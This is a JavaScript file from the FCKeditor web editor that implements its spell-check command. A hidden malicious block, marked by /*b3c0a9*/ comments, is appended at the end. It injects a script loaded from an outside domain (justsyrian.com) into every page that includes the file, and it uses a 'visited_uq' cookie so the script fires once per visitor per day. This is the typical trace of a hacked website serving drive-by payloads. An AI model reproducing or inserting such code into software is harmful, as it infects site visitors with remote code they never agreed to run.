var FCKSpellCheckCommand = function()
{
	this.Name = 'SpellCheck' ;
	this.IsEnabled = ( FCKConfig.SpellChecker == 'ieSpell' || FCKConfig.SpellChecker == 'SpellerPages' ) ;
}

FCKSpellCheckCommand.prototype.Execute = function()
{
	switch ( FCKConfig.SpellChecker )
	{
		case 'ieSpell' :
			this._RunIeSpell() ;
			break ;
		
		case 'SpellerPages' :
			FCKDialog.OpenDialog( 'FCKDialog_SpellCheck', 'Spell Check', 'dialog/fck_spellerpages.html', 440, 480 ) ;
			break ;
	}
}

FCKSpellCheckCommand.prototype._RunIeSpell = function()
{
	try
	{
		var oIeSpell = new ActiveXObject( "ieSpell.ieSpellExtension" ) ;
		oIeSpell.CheckAllLinkedDocuments( FCK.EditorDocument ) ;
	}
	catch( e )
	{
		if( e.number == -2146827859 )
		{
			if ( confirm( FCKLang.IeSpellDownload ) )
				window.open( FCKConfig.IeSpellDownloadUrl , 'IeSpellDownload' ) ;
		}
		else
			alert( 'Error Loading ieSpell: '   e.message   ' ('   e.number   ')' ) ;
	}
}

FCKSpellCheckCommand.prototype.GetState = function()
{
	return this.IsEnabled ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
